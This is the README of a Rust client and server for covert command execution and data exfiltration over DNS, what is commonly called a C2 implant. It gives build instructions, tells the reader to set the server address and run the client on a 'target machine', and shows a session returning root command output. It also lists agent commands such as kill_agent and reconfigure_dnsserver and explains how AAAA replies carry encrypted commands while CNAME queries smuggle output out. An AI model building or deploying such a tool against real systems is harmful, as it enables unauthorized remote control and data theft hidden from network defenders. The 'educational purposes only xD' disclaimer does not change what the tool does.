# DNS Based Command Execution
A simple rust client and server utilities for DNS based command execution and data exfiltration

## Features
 - AES-GCM encyption for the commands to be executed and the output that will be exfiltrated
 
 - Commands are fetched from the DNS server as an encrypted string encoded as IPv6 addresses
      
 - Data is exfiltrated as a series of CNAME requests to the dns server.
 
 - DNS client is running as a process, with a configurable sleep timer, default value is 5 seconds

 - DNS server's address can also be configured dynamically while the client is running.


## Limitations
 - The DNS server is making use of rust's dns-server crate which is using UDP as a transport protocol, messages are limited to 512 bytes (RFC), however data is split into chunks so this is not that big limitation
 - No interactive command support (like text editors etc.), at the moment all commands are executed with a spawned shell process (`sh` for linux, `cmd` for windows).

 
 
## TODO
 - Switch from `std::process::Command` to a more native way for executing commands on linux and windows
 - Add the ability to download/upload files
 - Add support for configurable encryption key
 
 
## Dependencies
The project is built with two main dependencies `rustdns` for the client and `dns-server` for the server.


## Usage
The project is organized in a simple rust workspace, so just compile the server and client binary.

```bash
root@2cc16c1a4c39:/# cargo build -p client
    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.11s
root@2cc16c1a4c39:/# cargo build -p server
    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.07s
root@2cc16c1a4c39:/mnt/dnsExfil# 

```

At the moment the DNS Server's address and port are hardcoded in the client, so make sure to change it

```rust
    //Initial value
    unsafe {
        DNS_SERVER = "192.168.1.16:53".to_string();
    }
```

Run the client on the target machine, run the server and start inputing commands
```bash
root@cf4cb157ea1a:/# target/debug/server 
[+] Starting dns server on port 53
#> id
#> 
uid=0(root) gid=0(root) groups=0(root)


#> hostname
#> 
2cc16c1a4c39

#> help
[+] Available commands:
        reconfigure_sleep INT -> Reconfigure the client's sleep interval, default is 5 secs
        exit -> Terminates the DNS Server process, this wont terminate the client, it will keep polling every SLEEP secs
        kill_agent -> Instructs the dns client to terminate its process
        reconfigure_dnsserver ADDR -> Reconfigure the client's dns server connection string 
```

The way it works is as follows:
1. Command is input on the server
2. It get stored in a static variable
3. The client makes AAAA (IPv6) request every SLEEP seconds to check for commands
4. The server responds with encrypted and encoded (as IPv6) command to the AAAA query
5. The client executes the commands (after decoding and decryption) encrypts the output and constructs a series of CNAME queries which are send to the server, after the final part an A query is send to signify the end of the data
6. The server receives the queries, parses and accumulates the data and after an A request is received, it decodes, decrypts the data and outputs it.



## Disclaimer
As always this simple tool is created for educational purposes only xD